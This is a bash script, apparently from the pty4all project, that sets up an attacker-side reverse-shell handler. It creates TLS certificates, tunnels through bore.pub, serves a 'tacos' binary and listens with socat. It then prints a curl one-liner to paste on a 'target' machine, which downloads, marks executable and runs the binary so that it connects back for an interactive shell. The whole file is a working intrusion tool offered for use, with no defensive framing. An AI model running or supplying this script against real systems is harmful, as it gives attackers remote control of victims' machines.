#!/bin/bash

# From https://github.com/laluka/pty4all

for i in "$@"; do
    case $i in
    --lport|-p)
        LPORT="$2"
        shift;shift;
        ;;
    --webport)
        WEBPORT="$2"
        shift;shift;
        ;;
    --windows|-w)
        WINDOWS=true
        ;;
    --help|-h)
        HELP=true
        ;;
    *)    
        ;;
    esac
done

# Default value + envvar
SCRIPTNAME=$(readlink -f "$0")
BASEDIR=$(dirname "$SCRIPTNAME")


if [[ -z "$LPORT" ]];
then
    LPORT=4444
fi

if [[ -z "$WEBPORT" ]];
then
    WEBPORT=9292
fi

if [[ "$HELP" ]];
then
    echo "Usage : $0 -p <socat_port>"
    exit 92
fi

if [[ -z "${TMUX}" ]]; then
    echo "Must be run in tmux"
    exit 92
fi

if [[ "$WINDOWS" ]]; then
    BINARY="tacos.exe"
    SCRIPT=$BASEDIR"/socat-forker-windows.sh"
else
    BINARY="tacos"
    SCRIPT=$BASEDIR"/socat-forker.sh"
fi

# TLS part
echo -e "\n\n\n[+] Generating tls certs and keys"
if [ -f server.pem ]; then
    echo "[+] Files already exist, using server.pem"
else
    rm server.key server.crt server.pem
    yes "" | openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 30 -out server.crt
    cat server.key server.crt >server.pem
fi

cp ${SCRIPT}.tpl ${SCRIPT}


# launch bore
TEAL='\033[1;36m'
NC='\033[0m' # No Color
echo "[+] Launch bore tunneling"
tmux split-window -v "bore local 9292 --to bore.pub" #TODO: 9292 port as a flag
printf "${TEAL}please enter bore.pub remote_port given? ${NC}"
read BPORT
BENDPOINT="bore.pub:${BPORT}"
URL="http://${BENDPOINT}/${SECRET}"

#gitar shortcut + launch gitar
if [[ ! $WINDOWS ]]; then
    echo "[+] gitar shortcuts enabled on reverse shell"
    sed -i "s/GITAR_PORT/${WEBPORT}/g" ${SCRIPT}
    sed -i "s/GITAR_HOST/${URL}/g" ${SCRIPT}  #Fix, I need -a and not -e
fi
echo "[+] launch gitar server"
SECRET=$RANDOM
tmux split-window -h "gitar -a https://${BENDPOINT} -f ${LPORT} --secret ${SECRET}"


# put tacos in current directory
PWD=$(pwd)
if [[ -f "./$BINARY" ]];then
    echo "[*] ${BINARY} is already in ${PWD}"
else
    RED='\033[1;31m'
    NC='\033[0m' # No Color
    printf "${RED}[*] Put ${BINARY} in ${PWD} before launching reverse shell process${NC}\n"

fi

# message/output
echo "[*] Copy/paste following command on target and enjoy your meal 🌮:"

DOWNLOAD_URL="${URL}/pull/${BINARY}"
SHUTDOWN_URL="${URL}/shutdown"


# LISTEN
echo
if [[ "$WINDOWS" ]]; then
    echo "(🪟) curl -O $DOWNLOAD_URL &&  curl $SHUTDOWN_URL && .\\${BINARY} ${BENDPOINT}"
    socat OPENSSL-LISTEN:${LPORT},cert=server.pem,verify=0,reuseaddr,fork EXEC:${SCRIPT},pty
else
    echo "(🐧) curl -s -O $DOWNLOAD_URL &&  curl $SHUTDOWN_URL && chmod +x ${BINARY} && ./${BINARY} ${BENDPOINT}"
    socat OPENSSL-LISTEN:${LPORT},cert=server.pem,verify=0,reuseaddr,fork EXEC:${SCRIPT},pty,raw,echo=0
fi
